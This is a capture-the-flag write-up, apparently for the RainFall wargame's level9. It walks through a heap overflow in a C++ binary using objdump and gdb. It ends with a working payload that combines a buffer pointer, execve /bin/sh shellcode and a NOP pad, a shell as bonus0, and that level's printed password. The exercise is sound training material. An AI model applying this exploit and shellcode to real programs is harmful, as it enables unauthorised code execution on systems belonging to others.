Objdump:

```nasm
080485f4 <main>:
 80485f4:	55                   	push   %ebp
 80485f5:	89 e5                	mov    %esp,%ebp
 80485f7:	53                   	push   %ebx
 80485f8:	83 e4 f0             	and    $0xfffffff0,%esp
 80485fb:	83 ec 20             	sub    $0x20,%esp
 80485fe:	83 7d 08 01          	cmpl   $0x1,0x8(%ebp)
 8048602:	7f 0c                	jg     8048610 <main+0x1c>
 8048604:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 804860b:	e8 e0 fe ff ff       	call   80484f0 <_exit@plt>
 8048610:	c7 04 24 6c 00 00 00 	movl   $0x6c,(%esp)
 8048617:	e8 14 ff ff ff       	call   8048530 <_Znwj@plt>
 804861c:	89 c3                	mov    %eax,%ebx
 804861e:	c7 44 24 04 05 00 00 	movl   $0x5,0x4(%esp)
 8048625:	00 
 8048626:	89 1c 24             	mov    %ebx,(%esp)
 8048629:	e8 c8 00 00 00       	call   80486f6 <_ZN1NC1Ei>
 804862e:	89 5c 24 1c          	mov    %ebx,0x1c(%esp)
 8048632:	c7 04 24 6c 00 00 00 	movl   $0x6c,(%esp)
 8048639:	e8 f2 fe ff ff       	call   8048530 <_Znwj@plt>
 804863e:	89 c3                	mov    %eax,%ebx
 8048640:	c7 44 24 04 06 00 00 	movl   $0x6,0x4(%esp)
 8048647:	00 
 8048648:	89 1c 24             	mov    %ebx,(%esp)
 804864b:	e8 a6 00 00 00       	call   80486f6 <_ZN1NC1Ei>
 8048650:	89 5c 24 18          	mov    %ebx,0x18(%esp)
 8048654:	8b 44 24 1c          	mov    0x1c(%esp),%eax
 8048658:	89 44 24 14          	mov    %eax,0x14(%esp)
 804865c:	8b 44 24 18          	mov    0x18(%esp),%eax
 8048660:	89 44 24 10          	mov    %eax,0x10(%esp)
 8048664:	8b 45 0c             	mov    0xc(%ebp),%eax
 8048667:	83 c0 04             	add    $0x4,%eax
 804866a:	8b 00                	mov    (%eax),%eax
 804866c:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048670:	8b 44 24 14          	mov    0x14(%esp),%eax
 8048674:	89 04 24             	mov    %eax,(%esp)
 8048677:	e8 92 00 00 00       	call   804870e <_ZN1N13setAnnotationEPc>
 804867c:	8b 44 24 10          	mov    0x10(%esp),%eax
 8048680:	8b 00                	mov    (%eax),%eax
 8048682:	8b 10                	mov    (%eax),%edx
 8048684:	8b 44 24 14          	mov    0x14(%esp),%eax
 8048688:	89 44 24 04          	mov    %eax,0x4(%esp)
 804868c:	8b 44 24 10          	mov    0x10(%esp),%eax
 8048690:	89 04 24             	mov    %eax,(%esp)
 8048693:	ff d2                	call   *%edx
 8048695:	8b 5d fc             	mov    -0x4(%ebp),%ebx
 8048698:	c9                   	leave  
 8048699:	c3                   	ret

0804870e <_ZN1N13setAnnotationEPc>:
 804870e:	55                   	push   %ebp
 804870f:	89 e5                	mov    %esp,%ebp
 8048711:	83 ec 18             	sub    $0x18,%esp ; réserve 24 sur la pile
 8048714:	8b 45 0c             	mov    0xc(%ebp),%eax ; charge argv dans eax
 8048717:	89 04 24             	mov    %eax,(%esp) ; met argv à l'adresse dans esp
 804871a:	e8 01 fe ff ff       	call   8048520 <strlen@plt>
 804871f:	8b 55 08             	mov    0x8(%ebp),%edx ; met l'instance this dans edx
 8048722:	83 c2 04             	add    $0x4,%edx ; +4 à edx pour pointer vers la copie
 8048725:	89 44 24 08          	mov    %eax,0x8(%esp) ; place le resultat de strlen dans esp+8 (arg3)
 8048729:	8b 45 0c             	mov    0xc(%ebp),%eax ; remet argv dans eax
 804872c:	89 44 24 04          	mov    %eax,0x4(%esp) ; met argv dans esp+4 (arg2)
 8048730:	89 14 24             	mov    %edx,(%esp) ; place dest de la copie dans esp (sommet de la stack)
 8048733:	e8 d8 fd ff ff       	call   8048510 <memcpy@plt> ; call memcpy
 8048738:	c9                   	leave  
 8048739:	c3                   	ret
```

After allocation, the address of instance N is stored in the ebx register:

```nasm
   0x08048626 <+50>:	mov    %ebx,(%esp)
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    %ebx,0x1c(%esp)
   0x08048632 <+62>:	movl   $0x6c,(%esp)

Breakpoint 7, 0x0804862e in main ()
(gdb) i r ebx
ebx            0x804a008	134520840
```

As the code indicates, the instance has a space of 108, after which the program segfaults when exceeding this number of characters.

The copy will be at `0x804a00c`, which corresponds to `0x804a008 + 4`. This can be confirmed during normal program usage:

```nasm
Breakpoint 3, 0x08048730 in N::setAnnotation(char*) ()
(gdb) i r edx
edx            0x804a00c	134520844
```

When exceeding the offset of 4 characters, the program segfaults here:

```nasm
=> 0x08048682 <+142>:	mov    (%eax),%edx
```

The reason is that eax contains an invalid address, "ABCD":

```nasm
Breakpoint 4 at 0x8048682
(gdb) i r
eax            0x44434241	1145258561
ecx            0x44434241	1145258561
edx            0x804a1cc	134521292
ebx            0x804a078	134520952
esp            0xbffff550	0xbffff550
ebp            0xbffff578	0xbffff578
```

If you provide it with a dummy but valid address, the content at that address will be transferred to edx, which will then be called. For example, if you set it to 0x08048310 (totally random)

```nasm
$(python -c 'print "A" * 108 + "\x10\x83\x04\x08"')
```

The content at the address present in eax will be loaded into edx.

```nasm
=> 0x08048682 <+142>:	mov    (%eax),%edx
   0x08048684 <+144>:	mov    0x14(%esp),%eax
   0x08048688 <+148>:	mov    %eax,0x4(%esp)
   0x0804868c <+152>:	mov    0x10(%esp),%eax
   0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
```

```nasm
(gdb) i r edx
edx            0x666e695f	1718511967 ; <- value loaded by 0x8048310 adress
```

And inevitably, it will segfault here because `0x666e695f` was the value in `0x8048310` and not a valid adress:

```nasm
Program received signal SIGSEGV, Segmentation fault.
0x666e695f in ?? ()
```

So the idea here is to place a valid address in which we have control over the buffer. We can use the copy of instance N created by memcpy, which is located at `0x804a00c`. In theory, eax will load this address into edx, which will then be called by `call *%edx` instruction.

Since this copy contains our argument, we can inject a shellcode at the beginning of the buffer, fill it with NOP instructions until it reaches a size of 108, and specify the address of the instance from 108 to 112.

This results in: shellcode + NOP + address =

```nasm
$(python -c 'print "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 87 + "\x0c\xa0\x04\x08"') 
```

I used this 21-byte shellcode: https://shell-storm.org/shellcode/files/shellcode-752.html 

Okay, let's see how it goes:

```nasm
=> 0x08048690 <+156>:	mov    %eax,(%esp)
   0x08048693 <+159>:	call   *%edx
   0x08048695 <+161>:	mov    -0x4(%ebp),%ebx
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.

...

(gdb) i r
eax            0x804a078	134520952
ecx            0x804a00c	134520844
edx            0xe1f7c931	-503854799
ebx            0x804a078	134520952

...

(gdb) s
Single stepping until exit from function main,
which has no line number information.

Program received signal SIGSEGV, Segmentation fault.
0xe1f7c931 in ?? ()
```

Edx seems to contain the shellcode properly (we see his first bytes), but we still segfault because, obviously, the first 4 bytes of this shellcode are not an address 🙂

It's ugly, but as a workaround, let's use the first 4 bytes of the buffer to designate an address, which would simply be the beginning of the buffer + 4 to reach the shellcode, so `0x0804a010`!

```nasm
$(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08"')
```

It works!

And here is the flag :

```nasm
level9@RainFall:~$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "\x90" * 83 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```